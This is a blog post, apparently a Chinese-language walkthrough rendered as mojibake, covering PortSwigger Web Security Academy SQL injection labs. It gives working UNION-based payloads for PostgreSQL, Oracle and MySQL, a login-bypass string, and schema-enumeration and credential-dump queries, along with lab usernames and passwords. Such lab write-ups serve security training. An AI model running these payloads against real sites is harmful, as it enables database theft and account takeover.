<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PortSwiggeræ‰“é¶éšè®° | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>PortSwiggeræ‰“é¶éšè®°</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-11T04:58:22.000Z" id="date"> 2023-07-11</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-22T09:04:41.939Z" id="updated"> 2023-07-22</time></div></span></div></div><hr><div id="post-content"><p>è¿™ç¯‡æ–‡ç« æ¥æ‰“burpå®˜æ–¹æä¾›çš„portswiggerçš„éƒ¨åˆ†é¶åœº</p>
<span id="more"></span>

<h1 id="postgresqlæ³¨å…¥"><a href="#postgresqlæ³¨å…¥" class="headerlink" title="postgresqlæ³¨å…¥"></a>postgresqlæ³¨å…¥</h1><p>ç‚¹è¿›å»æ˜¯å•†å“è®¢è´­ç•Œé¢ï¼Œéšä¾¿ç‚¹è¿›å»ä¸€ä¸ªï¼ŒæŸ¥çœ‹urlï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/product?productId=7<br></code></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¸å°±æ¥äº†å—ï¼Ÿä½†æ˜¯è¿™é‡Œåˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜â€”-&gt;åˆ¤æ–­ä¸å‡ºé—­åˆï¼Ÿ</p>
<p>å•å¼•å·åŒå¼•å· and 1&#x3D;1 and 1&#x3D;2 éƒ½æ˜¯ä¸€ä¸ªæŠ¥é”™é¡µé¢ï¼š<code>&quot;Invalid product ID&quot;</code></p>
<p>éš¾é“æ³¨å…¥çš„ç‚¹ä¸æ˜¯åœ¨è¿™é‡Œï¼Ÿå›åˆ°ä¸»ç•Œé¢å†è¯•è¯•çœ‹ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªcategoryçš„å‚æ•°ä¼ é€’çš„ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://0acd0080047e94b286d27aae00ca001f.web-security-academy.net/filter?category=Accessories<br></code></pre></td></tr></table></figure>

<p>å°è¯•æ³¨å…¥ï¼Œï¼Œï¼ŒæˆåŠŸæµ‹è¯•å‡ºæ³¨å…¥ç‚¹ï¼</p>
<ol>
<li><p>é—­åˆ å•å¼•å·</p>
</li>
<li><p>å­—æ®µæ•°ï¼š8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Accessories&#x27; order by 8--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>å°è¯•è”åˆæŸ¥è¯¢è·å–å›æ˜¾ç‚¹ï¼Œï¼Œå¤±è´¥ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥ï¼Œï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œï¼Œå°è¯•å¸ƒå°”ç›²æ³¨</p>
<p>è¿™ä¸ªå€’æ˜¯æˆåŠŸäº†ï¼Œæœ‰ä¸åŒçš„é¡µé¢</p>
<p>ä½†æ˜¯å¸ƒå°”ç›²æ³¨è¿‡äºéº»çƒ¦ï¼Œè¿™é‡Œä¸è®°å½•äº†ï¼Œè¿™é‡Œå°è¯•æ–°çš„æ³¨å…¥æ–¹æ³•ï¼šsqlmapä¸‡èƒ½æ³¨å…¥ğŸ˜</p>
<p class='item-img' data-src='/1.png'><img src="/1.png"></p>
</li>
</ol>
<p>åŸæ¥æ˜¯postgresqlæ•°æ®åº“ç±»å‹ï¼Œæš‚æ—¶é€€ä¸‹sqlmapï¼Œçœ‹ç€ä¸Šæ¬¡æ¢³ç†çš„æ–‡ç« å®æ“ä¸€ä¸‹å§</p>
<p>æ³¨å‡ºå›æ˜¾ç‚¹:</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,null,null,null,null,null,null,null--+</span><br></code></pre></td></tr></table></figure>

<p>ç„¶ååˆ¤æ–­æ¯ä¸€ä½çš„æ•°æ®ç±»å‹ï¼Œä¸€ä½ä¸€ä½çš„æ›¿æ¢ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27;,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>â€‹	ç•Œé¢çš„å›æ˜¾ç‚¹æ˜¯null2ï¼Œç„¶åæˆ‘ä»¬è·å–æ•°æ®åº“ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,current_database(),null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰æ•°æ®åº“åæ˜¯<code>academy_labs</code></p>
<p>ç„¶åæŸ¥è¡¨åï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,tablename,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from pg_tables where schemaname=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰è¡¨åæ˜¯<code>products</code>ï¼Œç„¶åè·å–åˆ—åï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,column_name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from information_schema.columns where table_schema=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>products<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>

<p>è·å–å‡ºäº†åˆ—åï¼š</p>
<p><code>id category name rating price image released description</code></p>
<p>ç„¶ådumpå…¨éƒ¨å†…å®¹ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=Accessories<span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,price||&#x27;</span>::<span class="hljs-string">&#x27;||name,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from public.products--+</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±åªæŒ‘é€‰ä¸¤åˆ—çš„å†…å®¹å§ï¼ŒæˆåŠŸdumpå…¨éƒ¨ï¼š</p>
<p class='item-img' data-src='/2.png'><img src="/2.png"></p>
<p>æˆåŠŸï¼å®Œç¾</p>
<p>è¿™ä¸€æ¬¡çš„ä¸»è¦å…³é”®ç‚¹æ˜¯å¯¹äºæ•°æ®åº“ç±»å‹çš„åˆ¤æ–­ï¼Œéœ€è¦å€ŸåŠ©sqlmapæ¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ä»¥è¿›è¡Œæ³¨å…¥è¯­å¥çš„é€‰æ‹©</p>
<h1 id="ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡"><a href="#ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡" class="headerlink" title="ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡"></a>ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡</h1><p>ç›¸æ¯”å‰é¢ä¸€å…³ï¼Œè¿™ä¸€å…³ä¼¼ä¹æ²¡æœ‰äº†categoryçš„è¿™ä¸ªé€‰é¡¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä»å…¶ä»–åœ°æ–¹æ‰¾æ³¨å…¥ç‚¹</p>
<p>è´­ç‰©å•†å“çš„idåº”è¯¥æ˜¯æ³¨å…¥ä¸äº†ï¼Œçœ‹è¿™ä¸ªé¶åœºçš„æ ‡é¢˜ï¼Œåº”è¯¥æ˜¯ç™»å½•æ¡†ä¸‹çš„postæ³¨å…¥ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªMyAccounté€‰é¡¹ï¼Œçœ‹æ¥å°±æ˜¯è¿™ä¸ªäº†</p>
<p>æ„é€ ä¸‡èƒ½å¯†ç ï¼š<code>admin&#39; or 1=1 --+</code></p>
<p>å‘ç°æç¤ºç”¨æˆ·ååæœ‰é—®é¢˜ï¼Œåæ¥åˆçœ‹äº†å¥½ä¹…ä¹Ÿä¸çŸ¥é“é—®é¢˜åœ¨å“ªé‡Œã€‚ã€‚å°±ç®—æ˜¯postgresqlæ•°æ®åº“ä¹Ÿä¸åº”è¯¥å‡ºç°é—®é¢˜</p>
<p>çœ‹äº†ä»¥ä¸‹å®˜æ–¹ç»™å‡ºçš„solutionï¼ŒåŸæ¥è¿™é‡Œçš„ç”¨æˆ·åæ˜¯administratorï¼</p>
<p>å› æ­¤æˆ‘ä»¬çš„ä¸‡èƒ½å¯†ç åº”è¯¥æ˜¯<code>administratror&#39; or 1=1--</code></p>
<p>è¿™é‡ŒåˆæŠ±ç€å°è¯•çš„å¿ƒç†æƒ³è¯•è¯•çœ‹<code>&#39; or 1=1--+</code>è¿™ä¸ªä¸‡èƒ½å¯†ç å¯ä¸å¯ä»¥ç”¨ï¼Œç»“æœå‘ç°æ˜¯å¯ä»¥çš„ï¼</p>
<h1 id="orancleæ³¨å…¥"><a href="#orancleæ³¨å…¥" class="headerlink" title="orancleæ³¨å…¥"></a>orancleæ³¨å…¥</h1><p>è¿™ä¸€å…³æç¤ºæ˜¯orancleæ•°æ®åº“äº†</p>
<ol>
<li><p>åˆ¤æ–­é—­åˆâ€”&gt;å•å¼•å·ï¼Œå’ŒMySQLä¸€æ ·</p>
</li>
<li><p>åˆ¤æ–­å­—å­—æ®µæ•°â€”&gt;2ï¼Œå’ŒMySQLä¸€æ ·</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Pets<span class="hljs-string">&#x27; union all select &#x27;</span>null1<span class="hljs-string">&#x27;,&#x27;</span>null2<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªéƒ½æ˜¯å­—ç¬¦ç±»å‹çš„å¹¶ä¸”éƒ½æœ‰å›æ˜¾</p>
</li>
<li><p>è·å–ç”¨æˆ·å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span>Gifts<span class="hljs-string">&#x27; union all select user,&#x27;</span>null114514<span class="hljs-string">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>é€šè¿‡ç”¨æˆ·åè·å–å…¨éƒ¨è¡¨åï¼Œè¿™ä¸ªæ˜¯æœ€é«˜æ•ˆçš„</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (select LISTAGG(table_name,&#x27;</span>,<span class="hljs-string">&#x27;)within group(order by owner)name from all_tables where owner=&#x27;</span>PETER<span class="hljs-string">&#x27;),&#x27;</span>null114514<span class="hljs-string">&#x27; from dual --</span><br></code></pre></td></tr></table></figure>

<p>æ³•äºŒ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select table_name,&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tables where rownum=1 --</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨ä¸­çš„åˆ—å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; --</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åç”¨è·å–åˆ°çš„åˆ—åä¸€æ­¥ä¸€æ­¥å¾€ä¸‹æ¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select (column_name),&#x27;</span>null114514<span class="hljs-string">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>CATEGORY<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>NAME<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RATING<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>PRICE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>IMAGE<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>RELEASED<span class="hljs-string">&#x27; and column_name&lt;&gt;&#x27;</span>DESCRIPTION<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>

<p>åˆ°è¿™ä¸€æ­¥æ²¡æœ‰æ›´å¤šçš„å›æ˜¾äº†å°±æ˜¯æ²¡æœ‰æ›´å¤šçš„åˆ—åäº†</p>
</li>
<li><p>dumpå…¨éƒ¨å†…å®¹</p>
<p>postgresqlæ²¡æœ‰MySQLé‚£æ ·æ–¹ä¾¿çš„group_concat()å‡½æ•°ï¼Œåªèƒ½ä¸€æ­¥ä¸€æ­¥çš„è‡ªå·±æ‰‹åŠ¨æ¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?category<span class="hljs-operator">=</span><span class="hljs-operator">-</span>Gifts<span class="hljs-string">&#x27; union select DESCRIPTION,&#x27;</span>null114514<span class="hljs-string">&#x27; from PRODUCTS --</span><br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>è‡³æ­¤ï¼Œè¿™ä¸ªé¶åœºå®Œç¾ç»“æŸï¼</p>
<h1 id="mysqlæ³¨å…¥"><a href="#mysqlæ³¨å…¥" class="headerlink" title="mysqlæ³¨å…¥"></a>mysqlæ³¨å…¥</h1><p>MySQLæ•°æ®åº“æ˜¯å§ï¼Œï¼Œï¼Œäº”åˆ†é’Ÿæ‹¿ä¸‹ï¼</p>
<ol>
<li><p>åˆ¤æ–­é—­åˆ å•å¼•å·</p>
</li>
<li><p>åˆ¤æ–­å­—æ®µæ•° 2</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹ 1 2éƒ½æ˜¯å›æ˜¾ç‚¹</p>
</li>
<li><p>è·å–æ•°æ®åº“å†…è¡¨å <code>products</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨åå†…åˆ—å <code>category,description,id,image,name,price,rating,released</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;products&#x27;--+<br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–å…¨éƒ¨æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=--Pets&#x27; union select 1,group_concat(category,description,id,image,name,price,rating,released) from products--+<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œå·²ç»ç»“æŸäº†ï¼Œæ€»å…±è€—æ—¶5åˆ†é’Ÿï¼Œä½†æ˜¯å‡ºæ¥ä»¥åçœ‹é¶åœºä¾æ—§æ˜¾ç¤ºæ²¡æœ‰é€šå…³ï¼Ÿ</p>
<p>å›é¶åœºåˆçœ‹äº†çœ‹ï¼Œå‘ç°é¡¶éƒ¨æœ‰ä¸€ä¸ªæç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Make the database retrieve the string: &#x27;8.0.33-0ubuntu0.20.04.2&#x27;<br></code></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯æŠŠpayloadæ¢æˆè¿™æ ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?category=-Pets&#x27; union select 1,&#x27;8.0.33-0ubuntu0.20.04.2&#x27;--+<br></code></pre></td></tr></table></figure>

<h1 id="postgresqlæ³¨å…¥2"><a href="#postgresqlæ³¨å…¥2" class="headerlink" title="postgresqlæ³¨å…¥2"></a>postgresqlæ³¨å…¥2</h1><p>è¿™ä¸€å…³æ–°å‡ºç°äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œçœ‹æ¥è¿™ä¸€å…³æ˜¯éœ€è¦bypass login</p>
<p>è¿™ä¸€å…³çš„é¢˜ç›®æè¿°å‘Šè¯‰æˆ‘ä»¬åº”è¯¥å…ˆè·å–åˆ°æ•°æ®åº“ä¸­çš„è¡¨ä¸­å†…å®¹ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æ•°æ®åº“ä¸­çš„è¡¨çš„å†…å®¹æˆåŠŸç™»å½•ï¼Œå› æ­¤æˆ‘ä»¬å…ˆä½¿ç”¨ç¬¬ä¸€å…³çš„æ³¨å…¥æ–¹å¼é‡æ–°æ³¨å…¥ä¸€é</p>
<p>æ­¥éª¤å°±çœç•¥äº†ï¼Œæ€»ä¹‹ï¼Œæœ€åçš„ä¸€æ­¥çš„payloadæ˜¯ï¼š</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?category=-Gifts<span class="hljs-string">&#x27; union select username_ucniul,password_yzwmyg from users_ckreei --+</span><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„æ•°æ®å°±åŒ…å«äº†æˆ‘ä»¬éœ€è¦çš„ç”¨æˆ·å’Œå¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	dl98o3trorz7cskbaguh<br>carlos<br>	qc4qisc9ndlsyjjs60nq<br>wiener<br>	34gdu60zq3tp7stmej8n<br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆï¼ŒæˆåŠŸç™»å½•ï¼</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></p>
<p>ï¼ˆç»™è‡ªå·±ç•™ä¸ªå‚è€ƒèµ„æ–™ï¼‰</p>
</blockquote>
<h1 id="orancleæ³¨å…¥2"><a href="#orancleæ³¨å…¥2" class="headerlink" title="orancleæ³¨å…¥2"></a>orancleæ³¨å…¥2</h1><p>å’Œä¸Šé¢ä¸€å…³å·®ä¸å¤šï¼Œåªæ˜¯æ¢äº†ä¸€ä¸ªæ•°æ®åº“ç±»å‹</p>
<p>å‰é¢çš„æ­¥éª¤ç›´æ¥ç•¥ï¼Œæœ€åè·å–åˆ°çš„å†…å®¹ï¼š</p>
<p>ç”¨æˆ·åï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">administrator<br>	2<br>carlos<br>	2<br>wiener<br>	2<br></code></pre></td></tr></table></figure>

<p>å¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2g8dqtbv9r0cek01r42y<br>	2<br>2ohduxnb1fdr59afvpiq<br>	2<br>ojqq1ah94210ymhe83k2<br>	2<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸç™»å½•äº†ï¼Œè¿™ä¸ªé¶åœºä¹Ÿæ˜¯å®Œç¾ç»“æŸäº†ï¼</p>
<h1 id="sqlè”åˆæ³¨å…¥"><a href="#sqlè”åˆæ³¨å…¥" class="headerlink" title="sqlè”åˆæ³¨å…¥"></a>sqlè”åˆæ³¨å…¥</h1><p>è¿™ä¸€å…³æ¯«æ— éš¾åº¦ï¼Œæˆ‘åœ¨æµ‹è¯•æ•°æ®åº“ç±»å‹çš„æ—¶å€™å°±ç›´æ¥é€šå…³äº†ï¼Œé€šå…³payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select null,null,null --+<br></code></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯postgresqlæ•°æ®åº“ç±»å‹</p>
<h1 id="sqlè”åˆæ³¨å…¥2"><a href="#sqlè”åˆæ³¨å…¥2" class="headerlink" title="sqlè”åˆæ³¨å…¥2"></a>sqlè”åˆæ³¨å…¥2</h1><p>è¿™ä¸€å¹²ä¹Ÿå’Œä¸Šé¢ä¸€å…³ä¸€æ ·ï¼Œåªæ˜¯éœ€è¦ä½ æ‰¾åˆ°å…¶ä¸­çš„å­—ç¬¦å‹å›æ˜¾ä½å¹¶è¾“å…¥æŒ‡å®šçš„å†…å®¹ï¼Œåªè¦æ•°æ®åº“æ¥å—åˆ°äº†è¿™ä¸ªæŒ‡å®šçš„å­—ç¬¦ï¼Œå°±é€šå…³äº†ï¼Œå…·ä½“çš„è¯•æ•°æ®ç±»å‹å¯ä»¥çœ‹ä¸Šé¢çš„postgresqlæ³¨å…¥</p>
<p>paylaodï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=Pets&#x27; union all select null,&#x27;MsJjXo&#x27;,null--+<br></code></pre></td></tr></table></figure>

<h1 id="sqlè”åˆæ³¨å…¥3"><a href="#sqlè”åˆæ³¨å…¥3" class="headerlink" title="sqlè”åˆæ³¨å…¥3"></a>sqlè”åˆæ³¨å…¥3</h1><p>åŒä¸Šé¢çš„ç« èŠ‚ã€Špostgresqlæ³¨å…¥2ã€‹</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select username,password from users--+<br></code></pre></td></tr></table></figure>

<h1 id="sqlè”åˆæ³¨å…¥4"><a href="#sqlè”åˆæ³¨å…¥4" class="headerlink" title="sqlè”åˆæ³¨å…¥4"></a>sqlè”åˆæ³¨å…¥4</h1><p>è¿™ä¸€å…³å’Œä¸Šé¢ä¸€å…³å”¯ä¸€çš„ä¸åŒå°±æ˜¯è¿™ä¸€å…³çš„å›æ˜¾ä½ç½®ä»1 2 éƒ½æ˜¯å˜æˆäº†åªæœ‰2æ˜¯å›æ˜¾ä½ç½®</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?category=-Pets&#x27; union all select &#x27;1&#x27;,username||&#x27;:&#x27;||password from users--+<br></code></pre></td></tr></table></figure>

<h1 id="sqlç›²æ³¨"><a href="#sqlç›²æ³¨" class="headerlink" title="sqlç›²æ³¨"></a>sqlç›²æ³¨</h1><p>ç›²æ³¨çš„é¶åœºå…¨éƒ¨è·³è¿‡ï¼Œç›´æ¥å»çœ‹å®˜æ–¹ç»™å‡ºçš„writeupå§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">é¶åœºBlind SQL injection with conditional responsesçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses<br><br>é¶åœºBlind SQL injection with conditional errorsçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>

<p>åé¢çš„å¾ˆå¤šé¶åœºç•¥ï¼Œéƒ½åœ¨<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
